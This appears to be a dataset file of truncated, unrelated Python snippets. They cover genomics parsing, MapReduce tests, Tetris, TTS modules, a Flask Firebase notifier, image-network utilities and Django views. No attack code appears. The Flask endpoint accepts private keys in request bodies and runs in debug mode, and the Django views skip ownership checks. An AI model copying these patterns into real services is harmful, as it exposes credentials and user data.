       'Somatic clinical impact review status', 'Oncogenicity classification',\n        'Oncogenicity date last evaluated', 'Oncogenicity review status', 'Gene(s)', 'Molecular consequence',\n        'Variant type' # After filter rows, we can remove this column\n    ]\n\n    # Drop Columns\n    return data.drop(columns=columns_to_drop, errors='ignore')\n\n\ndef __ref_mut_cDNA_extraction(data: pd.DataFrame) -> pd.DataFrame:\n    \"\"\"\n        Extract the reference and mutant cDNA nucleotides from the 'Name' column.\n    \"\"\"\n    # Extract wild-type and mutant nucleotides\n    data['cDNA_Ref'] = data['Name'].str.extract(r'[cg]\\.[\\d*+-]+([A-Z])>', expand=False)\n    data['cDNA_Mut'] = data['Name'].str.extract(r'[cg]\\.[\\d*+-]+[A-Z]>([A-Z])', expand=False)\n\n    return data\n\n# -- Extract Position -- #\n\ndef __extract_position(data: pd.DataFrame) -> pd.DataFrame:\n    \"\"\"\n        Extract the position from the 'Name' column.\n    \"\"\"\n    # Apply the function to cDNA_variant\n    data['cDNA_Position'] = data['Name'].apply(calculate_position)\n\n    return data\n    \n# Function to calculate absolute position from cDNA_variant\ndef calculate_position(variant):\n    try:\n        # Remove nucleotide change (e.g., G>A, T>C)\n        variant_cleaned = re.sub(r'[A-Z]>[A-Z].*', '', variant)\n        variant_cleaned = re.sub(r'.*c.', '', variant_cleaned)\n\n        # Handle 3' UTR positions like \"c.*5325\"",
    "from __future__ import annotations\r\nfrom dataclasses import dataclass\r\nfrom functools import total_ordering\r\nfrom multiprocessing import cpu_count\r\nfrom typing import List, Any, Tuple\r\nfrom multiprocess.pool import ThreadPool\r\nfrom mapyreduce.mapyreduce import MapperService, ReducerService, ChainReducer, Consumer\r\nimport pytest\r\n\r\n@dataclass(frozen=True)\r\n@total_ordering\r\nclass Integer:\r\n    \"\"\"\r\n    Integer class wraps an integer value and supports equality and ordering comparisons.\r\n    This class is used to demonstrate the mapping and reducing process.\r\n    \"\"\"\r\n    value: int\r\n\r\n    def __eq__(self, other):\r\n        if not isinstance(other, Integer):\r\n            return NotImplemented\r\n        return self.value == other.value\r\n\r\n    def __lt__(self, other):\r\n        if not isinstance(other, Integer):\r\n            return NotImplemented\r\n        return self.value < other.value\r\n\r\n    def __str__(self) -> str:\r\n        return f\"Integer[{self.value}]\"\r\n\r\n    class FromInt(MapperService):\r\n        \"\"\"\r\n        MapperService implementation that converts a list of integers to Integer objects.\r\n        This class represents the first step in the MapReduce chain.\r\n        \"\"\"\r\n        def __init__(self, int_list: List[Tuple[int,Integer]] | MapperService):\r\n            self._prev_data = int_list\r\n\r\n        @property\r\n        def data(self) -> List[Any]:\r\n            return self._prev_data if not isinstance(self._prev_data, MapperService) else self._prev_data.run()\r\n\r\n        def run(self) -> List[Tuple[Any, Any]]:\r\n            \"\"\"\r\n            Converts integers to Integer objects in parallel using ThreadPool.\r\n\r\n            Returns:\r\n                List of tuples where each tuple contains the original integer and its Integer wrapper.\r\n            \"\"\"\r\n            with ThreadPool(cpu_count()) as pool:\r\n                return pool.map(lambda x: (x, Integer(x)), self.data)\r\n\r\n    class Square(MapperService):\r\n        \"\"\"\r\n        MapperService implementation that squares the Integer values.\r\n        This represents the second step in the MapReduce chain.\r\n        \"\"\"\r\n        def __init__(self, int_list: List[Tuple[int,Integer]] | MapperService):\r\n            self._prev_data = int_list\r\n\r\n        @property\r\n        def data(self) -> List[Any]:\r\n            return self._prev_data if not isinstance(self._prev_data, MapperService) else self._prev_data.run()\r\n\r\n        def run(self) -> List[Tuple[Any, Any]]:\r\n            \"\"\"\r\n            Squares each Integer object in the list in parallel.\r\n\r\n            Returns:\r\n                List of tuples containing the original integer and its squared value wrapped in Integer.\r\n            \"\"\"\r\n            with ThreadPool(cpu_count()) as pool:\r\n                return pool.map(lambda x: (x[0], Integer(x[1].value ** 2)), self.data)\r\n\r\n    class ToList(ReducerService):\r\n        \"\"\"\r\n        ReducerService implementation that extracts the Integer values and returns them as a list.\r\n        This class represents the final reduction step to produce a list of results.\r\n        \"\"\"\r\n        def __init__(self, int_list: List[Tuple[int,Integer]] | MapperService):\r\n            self._prev_data = int_list\r\n\r\n        @property\r\n        def data(self) -> List[Any]:\r\n            return self._prev_data if not isinstance(self._prev_data, MapperService) else self._prev_data.run()\r\n\r\n        def run(self) -> Any:\r\n            \"\"\"\r\n            Extracts the Integer values and returns them as a list.\r\n\r\n            Returns:\r\n                List of integer values extracted from the Integer objects.\r\n            \"\"\"\r\n            return [v.value for k,v in self.data]\r\n\r\n    class Sum(ReducerService):\r\n        \"\"\"\r\n        ReducerService implementation that sums up the Integer values.\r\n        This represents an alternative reduction step to produce a single sum.\r\n        \"\"\"\r\n        def __init__(self, int_list: List[Tuple[int,Integer]] | MapperService):\r\n            self._prev_data = int_list\r\n\r\n        @property\r\n        def data(self) -> List[Any]:\r\n            return self._prev_data if not isinstance(self._prev_data, MapperService) else self._prev_data.run()\r\n\r\n        def run(self) -> Any:\r\n            \"\"\"\r\n            Sums up the Integer values from the tuples.\r\n\r\n            Returns:\r\n                Integer object representing the sum of all values.\r\n            \"\"\"\r\n            return Integer(sum([v.value for k,v in self.data]))\r\n\r\nclass TestIntegerChainReducer:\r\n    \"\"\"\r\n    Test suite for the ChainReducer class using Integer mapper and reducer services.\r\n    \"\"\"\r\n    chain_reducer = ChainReducer() \\\r\n               .add_data(([2,5,7,9],)) \\\r\n               .add_mapper(Integer.FromInt) \\\r\n               .add_mapper(Integer.Square) \\\r\n               .set_reducer(Integer.ToList)\r\n\r\n    def test_batch_run(self):\r\n        \"\"\"\r\n        Tests the full MapReduce chain in one go using batch processing.\r\n        \"\"\"\r\n        assert self.chain_reducer.run() == [4, 25, 49, 81]\r\n\r\n    def test_step_run(se",
    "import pygame\nimport sys\nimport random\nimport numpy as np\n\n# -------------------- CONFIG -------------------- #\nBLOCK_SIZE = 30               # Size of each Tetris cell\nBOARD_WIDTH = 10              # Columns\nBOARD_HEIGHT = 20             # Rows\nWINDOW_WIDTH = 500            # Pixel width of the window\nWINDOW_HEIGHT = BOARD_HEIGHT * BLOCK_SIZE\n\nBOARD_ORIGIN_X = 0\nBOARD_ORIGIN_Y = 0\n\nFPS = 60\n\n# Gravity intervals (in frames)\nNORMAL_DROP_INTERVAL = 48     # Move down every 48 frames (level 0)\nSOFT_DROP_INTERVAL = 5        # Move down every 5 frames if Down key is held\n\n# Colors\nWHITE = (255, 255, 255)\nBLACK = (0, 0, 0)\nLIGHT_GRAY = (200, 200, 200)\n\n# Tetris shape definitions\nSHAPES = {\n    \"I\": [(0, 0), (1, 0), (2, 0), (3, 0)],\n    \"O\": [(0, 0), (1, 0), (0, 1), (1, 1)],\n    \"T\": [(0, 0), (1, 0), (2, 0), (1, 1)],\n    \"S\": [(1, 0), (2, 0), (0, 1), (1, 1)],\n    \"Z\": [(0, 0), (1, 0), (1, 1), (2, 1)],\n    \"J\": [(0, 0), (0, 1), (1, 1), (2, 1)],\n    \"L\": [(2, 0), (0, 1), (1, 1), (2, 1)],\n}\n\n# Classic Tetris shape colors\nSHAPE_COLORS = {\n    \"I\": (0, 255, 255),     # Cyan\n    \"O\": (255, 255, 0),     # Yellow\n    \"T\": (128, 0, 128),     # Purple\n    \"S\": (0, 255, 0),       # Green\n    \"Z\": (255, 0, 0),       # Red\n    \"J\": (0, 0, 255),       # Blue\n    \"L\": (255, 165, 0),     # Orange\n}\n\n# Piece-specific pivot dictionary (classic approach).\n# Each shape rotates around this pivot in local coords.\nPIECE_PIVOTS = {\n    \"I\": (1.5, 0.5),\n    \"O\": (0.5, 0.5),\n    \"T\": (1.0, 1.0),\n    \"S\": (1.0, 1.0),\n    \"Z\": (1.0, 1.0),\n    \"J\": (1.0, 1.0),\n    \"L\": (1.0, 1.0),\n}\n\n\n# -------------------- 3D BLOCK RENDERING -------------------- #\ndef lighten_color(rgb, amount=0.3):\n    \"\"\"Lighten an (r, g, b) color by a factor 0.0..1.0.\"\"\"\n    r, g, b = rgb\n    r = min(255, int(r + (255 - r) * amount))\n    g = min(255, int(g + (255 - g) * amount))\n    b = min(255, int(b + (255 - b) * amount))\n    return (r, g, b)\n\ndef darken_color(rgb, amount=0.3):\n    \"\"\"Darken an (r, g, b) color by a factor 0.0..1.0.\"\"\"\n    r, g, b = rgb\n    r = max(0, int(r - r * amount))\n    g = max(0, int(g - g * amount))\n    b = max(0, int(b - b * amount))\n    return (r, g, b)\n\ndef draw_3d_block(surface, base_color, x, y, size):\n    \"\"\"\n    Draw a Tetris cell at (x, y) with dimension `size`,\n    using highlight/shadow for a 3D effect.\n    \"\"\"\n    # 1. Fill the main block\n    pygame.draw.rect(surface, base_color, (x, y, size, size))\n\n    # 2. Generate highlight & shadow colors\n    highlight = lighten_color(base_color, 0.4)\n    shadow = darken_color(base_color, 0.4)\n    edge_thick = 3\n\n    # 3. Draw highlight on top & left\n    pygame.draw.rect(surface, highlight, (x, y, size, edge_thick))        # top\n    pygame.draw.rect(surface, highlight, (x, y, edge_thick, size))        # left\n\n    # 4. Draw shadow on bottom & right\n    pygame.draw.rect(surface, shadow, (x, y + size - edge_thick, size, edge_thick))     # bottom\n    pygame.draw.rect(surface, shadow, (x + size - edge_thick, y, edge_thick, size))     # right\n\n\n# -------------------- SOUND: BEEPS -------------------- #\ndef generate_beep(freq=440, duration=0.2, volume=1.0, sample_rate=44100):\n    \"\"\"\n    Generate a simple sine-wave beep of `freq` Hz, lasting `duration` seconds.\n    Return it as a Pygame Sound object.\n    \"\"\"\n    num_samples = int(sample_rate * duration)\n    t = np.linspace(0, duration, num_samples, endpoint=False)\n    waveform = (volume * np.sin(2.0 * np.pi * freq * t)).astype(np.float32)\n    waveform_int16 = (waveform * 32767).astype(np.int16).tobytes()\n    return pygame.mixer.Sound(buffer=waveform_int16)\n\n\n# -------------------- MAIN TETRIS CLASS -------------------- #\nclass Tetris:\n    def __init__(self):\n        pygame.init()\n        self.screen = pygame.display.set_mode((WINDOW_WIDTH, WINDOW_HEIGHT))\n        pygame.display.set_caption(\"Tetris - Classic\")\n\n        # For held-key movement\n        pygame.key.set_repeat(200, 50)\n\n        self.clock = pygame.time.Clock()\n        self.font = pygame.font.Font(None, 36)\n\n        # Board: 2D array [BOARD_HEIGHT][BOARD_WIDTH], storing None or (r,g,b).\n        self.board = [[None for _ in range(BOARD_WIDTH)] for _ in range(BOARD_HEIGHT)]\n\n        # Current & next piece\n        self.current_shape, self.current_blocks = self.generate_piece()\n        self.next_shape, self.next_blocks = self.generate_piece()\n\n        self.current_color = SHAPE_COLORS[self.current_shape]\n        self.next_color = SHAPE_COLORS[self.next_shape]\n\n        # Start near top-middle\n        self.piece_x = BOARD_WIDTH // 2 - 2\n        self.piece_y = 0\n\n        # Score & lines\n        self.score = 0\n        self.lines_cleared_total = 0\n\n        # Level\n        self.level = 0\n\n        # Soft drop\n        self.soft_drop_active = False\n\n        # Frame-based drop\n        self.frame_count = 0\n        self.drop_interval = NORMAL_DROP_INTERVAL\n\n        # Sounds\n        pygame.mixer.init()\n        self.lock_beep = generate_beep(freq=300, duration=0.1, volume=0.5)\n        self.line_clear_beep = gene",
    "\"\"\"\nein notation:\nb - batch\nn - sequence\nnt - text sequence\nnw - raw wave length\nd - dimension\n\"\"\"\n\nfrom __future__ import annotations\n\nimport math\nfrom typing import Optional\n\nimport torch\nimport torch.nn.functional as F\nimport torchaudio\nfrom librosa.filters import mel as librosa_mel_fn\nfrom torch import nn\nfrom x_transformers.x_transformers import apply_rotary_pos_emb\n\n\n# raw wav to mel spec\n\n\nmel_basis_cache = {}\nhann_window_cache = {}\n\n\ndef get_bigvgan_mel_spectrogram(\n    waveform,\n    n_fft=1024,\n    n_mel_channels=100,\n    target_sample_rate=24000,\n    hop_length=256,\n    win_length=1024,\n    fmin=0,\n    fmax=None,\n    center=False,\n):  # Copy from https://github.com/NVIDIA/BigVGAN/tree/main\n    device = waveform.device\n    key = f\"{n_fft}_{n_mel_channels}_{target_sample_rate}_{hop_length}_{win_length}_{fmin}_{fmax}_{device}\"\n\n    if key not in mel_basis_cache:\n        mel = librosa_mel_fn(sr=target_sample_rate, n_fft=n_fft, n_mels=n_mel_channels, fmin=fmin, fmax=fmax)\n        mel_basis_cache[key] = torch.from_numpy(mel).float().to(device)  # TODO: why they need .float()?\n        hann_window_cache[key] = torch.hann_window(win_length).to(device)\n\n    mel_basis = mel_basis_cache[key]\n    hann_window = hann_window_cache[key]\n\n    padding = (n_fft - hop_length) // 2\n    waveform = torch.nn.functional.pad(waveform.unsqueeze(1), (padding, padding), mode=\"reflect\").squeeze(1)\n\n    spec = torch.stft(\n        waveform,\n        n_fft,\n        hop_length=hop_length,\n        win_length=win_length,\n        window=hann_window,\n        center=center,\n        pad_mode=\"reflect\",\n        normalized=False,\n        onesided=True,\n        return_complex=True,\n    )\n    spec = torch.sqrt(torch.view_as_real(spec).pow(2).sum(-1) + 1e-9)\n\n    mel_spec = torch.matmul(mel_basis, spec)\n    mel_spec = torch.log(torch.clamp(mel_spec, min=1e-5))\n\n    return mel_spec\n\n\ndef get_vocos_mel_spectrogram(\n    waveform,\n    n_fft=1024,\n    n_mel_channels=100,\n    target_sample_rate=24000,\n    hop_length=256,\n    win_length=1024,\n):\n    mel_stft = torchaudio.transforms.MelSpectrogram(\n        sample_rate=target_sample_rate,\n        n_fft=n_fft,\n        win_length=win_length,\n        hop_length=hop_length,\n        n_mels=n_mel_channels,\n        power=1,\n        center=True,\n        normalized=False,\n        norm=None,\n    ).to(waveform.device)\n    if len(waveform.shape) == 3:\n        waveform = waveform.squeeze(1)  # 'b 1 nw -> b nw'\n\n    assert len(waveform.shape) == 2\n\n    mel = mel_stft(waveform)\n    mel = mel.clamp(min=1e-5).log()\n    return mel\n\n\nclass MelSpec(nn.Module):\n    def __init__(\n        self,\n        n_fft=1024,\n        hop_length=256,\n        win_length=1024,\n        n_mel_channels=100,\n        target_sample_rate=24_000,\n        mel_spec_type=\"vocos\",\n    ):\n        super().__init__()\n        assert mel_spec_type in [\"vocos\", \"bigvgan\"], print(\"We only support two extract mel backend: vocos or bigvgan\")\n\n        self.n_fft = n_fft\n        self.hop_length = hop_length\n        self.win_length = win_length\n        self.n_mel_channels = n_mel_channels\n        self.target_sample_rate = target_sample_rate\n\n        if mel_spec_type == \"vocos\":\n            self.extractor = get_vocos_mel_spectrogram\n        elif mel_spec_type == \"bigvgan\":\n            self.extractor = get_bigvgan_mel_spectrogram\n\n        self.register_buffer(\"dummy\", torch.tensor(0), persistent=False)\n\n    def forward(self, wav):\n        if self.dummy.device != wav.device:\n            self.to(wav.device)\n\n        mel = self.extractor(\n            waveform=wav,\n            n_fft=self.n_fft,\n            n_mel_channels=self.n_mel_channels,\n            target_sample_rate=self.target_sample_rate,\n            hop_length=self.hop_length,\n            win_length=self.win_length,\n        )\n\n        return mel\n\n\n# sinusoidal position embedding\n\n\nclass SinusPositionEmbedding(nn.Module):\n    def __init__(self, dim):\n        super().__init__()\n        self.dim = dim\n\n    def forward(self, x, scale=1000):\n        device = x.device\n        half_dim = self.dim // 2\n        emb = math.log(10000) / (half_dim - 1)\n        emb = torch.exp(torch.arange(half_dim, device=device).float() * -emb)\n        emb = scale * x.unsqueeze(1) * emb.unsqueeze(0)\n        emb = torch.cat((emb.sin(), emb.cos()), dim=-1)\n        return emb\n\n\n# convolutional position embedding\n\n\nclass ConvPositionEmbedding(nn.Module):\n    def __init__(self, dim, kernel_size=31, groups=16):\n        super().__init__()\n        assert kernel_size % 2 != 0\n        self.conv1d = nn.Sequential(\n            nn.Conv1d(dim, dim, kernel_size, groups=groups, padding=kernel_size // 2),\n            nn.Mish(),\n            nn.Conv1d(dim, dim, kernel_size, groups=groups, padding=kernel_size // 2),\n            nn.Mish(),\n        )\n\n    def forward(self, x: float[\"b n d\"], mask: bool[\"b n\"] | None = None):  # noqa: F722\n        if mask is not None:\n            mask = mask[..., None]\n            x = x.masked_fill(~mask, 0.0)\n\n        x = x.p",
    "from flask import Flask, request, jsonify\nimport firebase_admin\nfrom firebase_admin import credentials, messaging\n\napp = Flask(__name__)\nfirebase_apps = {}\n\ndef get_firebase_app(service_account_json, project_id):\n    global firebase_apps\n    if project_id in firebase_apps:\n        return firebase_apps[project_id]\n\n    cred = credentials.Certificate(service_account_json)\n    app_instance = firebase_admin.initialize_app(cred, name=project_id)\n    firebase_apps[project_id] = app_instance\n    return app_instance\n\n@app.route('/api/send-notification', methods=['POST'])\ndef send_notification():\n    try:\n        data = request.get_json()\n\n        service_account_json = {\n            \"type\": data.get(\"type\"),\n            \"project_id\": data.get(\"project_id\"),\n            \"private_key_id\": data.get(\"private_key_id\"),\n            \"private_key\": data.get(\"private_key\"),\n            \"client_email\": data.get(\"client_email\"),\n            \"client_id\": data.get(\"client_id\"),\n            \"auth_uri\": data.get(\"auth_uri\"),\n            \"token_uri\": data.get(\"token_uri\"),\n            \"auth_provider_x509_cert_url\": data.get(\"auth_provider_x509_cert_url\"),\n            \"client_x509_cert_url\": data.get(\"client_x509_cert_url\"),\n        }\n        project_id = data.get(\"project_id\")\n\n        if not service_account_json or not project_id:\n            return jsonify({'success': False, 'error': 'Missing service_account or project_id'}), 400\n\n        firebase_app = get_firebase_app(service_account_json, project_id)\n\n        topic = data.get('topic')\n        token = data.get('token')\n\n        img_url = data.get('img_url', '')\n\n        notification = messaging.Notification(\n            title=data.get('title', 'Default Title'),\n            body=data.get('body', 'Default Body'),\n            image=img_url if img_url.strip() else None  # Include image if not empty\n        )\n\n        additional_data = data.get('data', {})\n\n        if topic:\n            message = messaging.Message(\n                notification=notification,\n                data=additional_data,\n                topic=topic,\n            )\n        elif token:\n            message = messaging.Message(\n                notification=notification,\n                data=additional_data,\n                token=token,\n            )\n        else:\n            return jsonify({'success': False, 'error': 'Missing topic or token'}), 400\n\n        response = messaging.send(message, app=firebase_app)\n        return jsonify({'success': True, 'response': response}), 200\n\n    except Exception as e:\n        return jsonify({'success': False, 'error': str(e)}), 500\n\nif __name__ == '__main__':\n    app.run(debug=True)\n    \n",
    "from painter import Painter\nfrom color_palette import ColorPalette\nfrom utils import setup_logging\n\nlogger = setup_logging()\n\n\nclass ArtManager:\n    def __init__(self, image_paths: list[str]):\n        \"\"\"Initialize ArtManager with image paths for color extraction\"\"\"\n        self.image_paths = image_paths\n        self.color_palette = ColorPalette()\n        self.colors = []\n        logger.info(\"ArtManager initialized\")\n\n    def prepare_colors(self):\n        \"\"\"Extract colors from provided images\"\"\"\n        try:\n            self.colors = self.color_palette.extract_colors(self.image_paths)\n            logger.info(f\"Successfully extracted {len(self.colors)} colors\")\n        except Exception as e:\n            logger.error(f\"Error extracting colors: {e}\")\n            raise\n\n    def create_painting(self, rows: int = 10, cols: int = 10,\n                        dot_size: int = 20, spacing: int = 50):\n        \"\"\"Create the painting with specified parameters\"\"\"\n        try:\n            painter = Painter(\n                color_list=self.colors,\n                dot_size=dot_size,\n                spacing=spacing\n            )\n            painter.paint_grid(rows=rows, cols=cols)\n            painter.finish()\n            logger.info(\"Painting completed successfully\")\n        except Exception as e:\n            logger.error(f\"Error during painting: {e}\")\n            raise\n",
    "\"\"\"\nevaluate.py\n-----------\nMain evaluation script for different open-vocabulary, fine-grained methods.\n\"\"\"\n\nimport logging\n\nimport hydra\nimport lightning as L\nfrom omegaconf import DictConfig\n\nfrom ovfgvg.data.modules import get_datamodule\nfrom ovfgvg.models import get_model, load_from_checkpoint\nfrom ovfgvg.modules import get_lightning_module\nfrom ovfgvg.utils import setup_environment, set_seed, prepare_trainer\n\n\n@hydra.main(version_base=None, config_path=\"../../config\", config_name=\"eval_config\")\ndef main(cfg: DictConfig):\n    # 1. setup environment\n    setup_environment(cfg.env)\n\n    # 2. load model\n    # 2a. instantiate model\n    model = get_model(cfg.model.model) if hasattr(cfg.model, \"model\") else None\n\n    eval_model = get_lightning_module(model, cfg.model.eval.module)\n\n    # 2b. preload weights from file/checkpoint\n    if cfg.model.eval.load_from_checkpoint:\n        eval_model = load_from_checkpoint(eval_model, cfg.model.checkpoint)\n    else:\n        logging.info(\"Skipping load from checkpoint.\")\n\n    # 3. load data\n    datamodule = get_datamodule(cfg.data, cfg.model.eval.data)\n\n    # 4. run model on data and generate metrics or visualizations\n    trainer_args = prepare_trainer(cfg.model.eval.trainer)\n    trainer = L.Trainer(**trainer_args, default_root_dir=cfg.env.save_dir)\n    result = trainer.test(model=eval_model, datamodule=datamodule)\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "import collections.abc\nimport math\nimport torch\nimport torchvision\nimport warnings\nfrom itertools import repeat\nfrom torch import nn as nn\nfrom torch.nn import functional as F\nfrom torch.nn import init as init\nfrom torch.nn.modules.batchnorm import _BatchNorm\nfrom torch.autograd import Function\n\n\n@torch.no_grad()\ndef default_init_weights(module_list, scale=1, bias_fill=0, **kwargs):\n    \"\"\"Initialize network weights.\n\n    Args:\n        module_list (list[nn.Module] | nn.Module): Modules to be initialized.\n        scale (float): Scale initialized weights, especially for residual\n            blocks. Default: 1.\n        bias_fill (float): The value to fill bias. Default: 0\n        kwargs (dict): Other arguments for initialization function.\n    \"\"\"\n    if not isinstance(module_list, list):\n        module_list = [module_list]\n    for module in module_list:\n        for m in module.modules():\n            if isinstance(m, nn.Conv2d):\n                init.kaiming_normal_(m.weight, **kwargs)\n                m.weight.data *= scale\n                if m.bias is not None:\n                    m.bias.data.fill_(bias_fill)\n            elif isinstance(m, nn.Linear):\n                init.kaiming_normal_(m.weight, **kwargs)\n                m.weight.data *= scale\n                if m.bias is not None:\n                    m.bias.data.fill_(bias_fill)\n            elif isinstance(m, _BatchNorm):\n                init.constant_(m.weight, 1)\n                if m.bias is not None:\n                    m.bias.data.fill_(bias_fill)\n\n\ndef make_layer(basic_block, num_basic_block, **kwarg):\n    \"\"\"Make layers by stacking the same blocks.\n\n    Args:\n        basic_block (nn.module): nn.module class for basic block.\n        num_basic_block (int): number of blocks.\n\n    Returns:\n        nn.Sequential: Stacked blocks in nn.Sequential.\n    \"\"\"\n    layers = []\n    for _ in range(num_basic_block):\n        layers.append(basic_block(**kwarg))\n    return nn.Sequential(*layers)\n\n\nclass ResidualBlockNoBN(nn.Module):\n    \"\"\"Residual block without BN.\n\n    Args:\n        num_feat (int): Channel number of intermediate features.\n            Default: 64.\n        res_scale (float): Residual scale. Default: 1.\n        pytorch_init (bool): If set to True, use pytorch default init,\n            otherwise, use default_init_weights. Default: False.\n    \"\"\"\n\n    def __init__(self, num_feat=64, res_scale=1, pytorch_init=False):\n        super(ResidualBlockNoBN, self).__init__()\n        self.res_scale = res_scale\n        self.conv1 = nn.Conv2d(num_feat, num_feat, 3, 1, 1, bias=True)\n        self.conv2 = nn.Conv2d(num_feat, num_feat, 3, 1, 1, bias=True)\n        self.relu = nn.ReLU(inplace=True)\n\n        if not pytorch_init:\n            default_init_weights([self.conv1, self.conv2], 0.1)\n\n    def forward(self, x):\n        identity = x\n        out = self.conv2(self.relu(self.conv1(x)))\n        return identity + out * self.res_scale\n\n\nclass Upsample(nn.Sequential):\n    \"\"\"Upsample module.\n\n    Args:\n        scale (int): Scale factor. Supported scales: 2^n and 3.\n        num_feat (int): Channel number of intermediate features.\n    \"\"\"\n\n    def __init__(self, scale, num_feat):\n        m = []\n        if (scale & (scale - 1)) == 0:  # scale = 2^n\n            for _ in range(int(math.log(scale, 2))):\n                m.append(nn.Conv2d(num_feat, 4 * num_feat, 3, 1, 1))\n                m.append(nn.PixelShuffle(2))\n        elif scale == 3:\n            m.append(nn.Conv2d(num_feat, 9 * num_feat, 3, 1, 1))\n            m.append(nn.PixelShuffle(3))\n        else:\n            raise ValueError(\n                f\"scale {scale} is not supported. Supported scales: 2^n and 3.\"\n            )\n        super(Upsample, self).__init__(*m)\n\n\ndef flow_warp(\n    x, flow, interp_mode=\"bilinear\", padding_mode=\"zeros\", align_corners=True\n):\n    \"\"\"Warp an image or feature map with optical flow.\n\n    Args:\n        x (Tensor): Tensor with size (n, c, h, w).\n        flow (Tensor): Tensor with size (n, h, w, 2), normal value.\n        interp_mode (str): 'nearest' or 'bilinear'. Default: 'bilinear'.\n        padding_mode (str): 'zeros' or 'border' or 'reflection'.\n            Default: 'zeros'.\n        align_corners (bool): Before pytorch 1.3, the default value is\n            align_corners=True. After pytorch 1.3, the default value is\n            align_corners=False. Here, we use the True as default.\n\n    Returns:\n        Tensor: Warped image or feature map.\n    \"\"\"\n    assert x.size()[-2:] == flow.size()[1:3]\n    _, _, h, w = x.size()\n    # create mesh grid\n    grid_y, grid_x = torch.meshgrid(\n        torch.arange(0, h, dtype=x.dtype, device=x.device),\n        torch.arange(0, w, dtype=x.dtype, device=x.device),\n        indexing=\"ij\",\n    )\n    grid = torch.stack((grid_x, grid_y), 2).float()  # W(x), H(y), 2\n    grid.requires_grad = False\n\n    vgrid = grid + flow\n    # scale grid to [-1,1]\n    vgrid_x = 2.0 * vgrid[:, :, :, 0] / max(w - 1, 1) - 1.0\n    vgrid_y = 2.0 * vgrid[:, :, :, 1] / max(h - 1, 1) - 1.0\n    vgr",
    "from django.shortcuts import render, get_object_or_404, redirect\nfrom django.contrib.auth.decorators import login_required\nfrom django.contrib.auth.mixins import LoginRequiredMixin\nfrom django.contrib import messages\nfrom django.views.generic import ListView, DetailView, CreateView, UpdateView, DeleteView\nfrom django.urls import reverse_lazy\nfrom django.db import models\nfrom django.http import JsonResponse\nfrom .models import OTPVerification, Project, Task, Category, Comment, UserProfile\nfrom .forms import   PasswordResetNewForm, ProjectForm, TaskForm, CategoryForm, CommentForm, UserRegistrationForm, LoginForm, PasswordResetForm, UserProfileForm\nfrom django.contrib.auth import logout\nfrom django.contrib.auth.forms import PasswordChangeForm\nfrom django.contrib.auth import login\nfrom django.core.mail import send_mail\nfrom django.template.loader import render_to_string\nfrom django.contrib.auth import update_session_auth_hash\nfrom django.contrib.auth.models import User\nfrom django.utils import timezone\n\nclass ProjectListView(LoginRequiredMixin, ListView):\n    model = Project\n    template_name = 'tasks/project_list.html'\n    context_object_name = 'projects'\n\n    def get_queryset(self):\n        queryset = Project.objects.filter(\n            models.Q(owner=self.request.user) |\n            models.Q(members=self.request.user)\n        ).distinct()\n        \n        search_query = self.request.GET.get('q')\n        if search_query:\n            queryset = queryset.filter(\n                models.Q(name__icontains=search_query) |\n                models.Q(description__icontains=search_query)\n            )\n        return queryset\n\nclass ProjectDetailView(LoginRequiredMixin, DetailView):\n    model = Project\n    template_name = 'tasks/project_detail.html'\n    context_object_name = 'project'\n\n    def get_context_data(self, **kwargs):\n        context = super().get_context_data(**kwargs)\n        tasks = self.object.tasks.all()\n        \n        # Filter tasks\n        status = self.request.GET.get('status')\n        priority = self.request.GET.get('priority')\n        \n        if status:\n            tasks = tasks.filter(status=status)\n        if priority:\n            tasks = tasks.filter(priority=priority)\n            \n        context['tasks'] = tasks\n        context['status_choices'] = Task.STATUS_CHOICES\n        context['priority_choices'] = Task.PRIORITY_CHOICES\n        return context\n\nclass ProjectCreateView(LoginRequiredMixin, CreateView):\n    model = Project\n    form_class = ProjectForm\n    template_name = 'tasks/project_form.html'\n    success_url = reverse_lazy('tasks:project-list')\n\n    def form_valid(self, form):\n        form.instance.owner = self.request.user\n        response = super().form_valid(form)\n        messages.success(self.request, 'Project created successfully!')\n        return response\n\nclass ProjectUpdateView(LoginRequiredMixin, UpdateView):\n    model = Project\n    form_class = ProjectForm\n    template_name = 'tasks/project_form.html'\n\n    def get_success_url(self):\n        return reverse_lazy('tasks:project-detail', kwargs={'slug': self.object.slug})\n\n    def form_valid(self, form):\n        response = super().form_valid(form)\n        messages.success(self.request, 'Project updated successfully!')\n        return response\n\nclass ProjectDeleteView(LoginRequiredMixin, DeleteView):\n    model = Project\n    template_name = 'tasks/project_confirm_delete.html'\n    success_url = reverse_lazy('tasks:project-list')\n\n    def delete(self, request, *args, **kwargs):\n        messages.success(self.request, 'Project deleted successfully!')\n        return super().delete(request, *args, **kwargs)\n\n@login_required\ndef task_detail(request, project_slug, task_id):\n    task = get_object_or_404(Task, id=task_id, project__slug=project_slug)\n    if request.method == 'POST':\n        form = TaskForm(request.POST, instance=task)\n        if form.is_valid():\n            form.save()\n            messages.success(request, 'Task updated successfully!')\n            return redirect('tasks:project-detail', slug=project_slug)\n    else:\n        form = TaskForm(instance=task)\n    \n    return render(request, 'tasks/task_detail.html', {\n        'task': task,\n        'form': form,\n    })\n\n@login_required\ndef task_create(request, project_slug):\n    project = get_object_or_404(Project, slug=project_slug)\n    print(project)\n    if request.method == 'POST':\n        form = TaskForm(request.POST, request.FILES, project=project)\n        if form.is_valid():\n            task = form.save(commit=False)\n            task.project = project\n            task.save()\n            messages.success(request, 'Task created successfully!')\n            return redirect('tasks:project-detail', slug=project_slug)\n    else:\n        form = TaskForm(project=project)\n    \n    return render(request, 'tasks/task_form.html', {\n        'form': form,\n        'project': project,\n    })\n\n@login_required\ndef task_status_update(request, task_id):\n    if request.method == 'POST' and request.heade",
